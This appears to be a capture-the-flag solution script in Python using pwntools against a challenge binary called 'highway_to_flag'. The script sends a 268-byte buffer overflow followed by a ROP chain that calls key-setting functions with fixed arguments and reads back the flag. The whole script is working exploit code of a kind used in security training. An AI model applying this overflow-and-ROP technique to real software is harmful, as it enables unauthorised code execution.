from pwn import *
io = process("./highway_to_flag")
log.info(io.recvuntil(" > "))

payload = b"A"*268

payload += p32(0x080491d8) #Set_keys3
payload += p32(0x0804901e) #Pop
payload += p32(0x00b00b00) #arg_1 de Set_keys3

payload += p32(0x080491c2) #Set_keys
payload += p32(0x0804939a) #Pop
payload += p32(0x0000cafe) #arg_1 Set_keys
payload += p32(0x0000f00d) #arg_2 Set_keys

payload += p32(0x080491f8)

io.sendline(payload)

log.success("pwned :D")
log.info(io.recvuntil("}"))
io.close()
